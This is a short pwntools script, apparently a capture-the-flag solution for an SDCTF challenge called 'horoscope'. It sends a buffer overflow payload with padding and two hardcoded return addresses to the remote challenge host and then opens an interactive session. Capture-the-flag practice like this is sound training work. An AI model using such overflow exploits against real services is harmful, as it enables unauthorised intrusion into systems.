from pwn import *
#must be run in bin to work

#p = process('./horoscope')
p = remote('horoscope.sdctf-307600-codelab.kctf.cloud', 1337)

payload = b'1/1/1/1/2222'+b'a'*40+b'bbbb'+p64(0x00000000040096e) + p64(0x000000000400950)

#gdb.attach(p)

p.sendline(payload)
p.interactive()
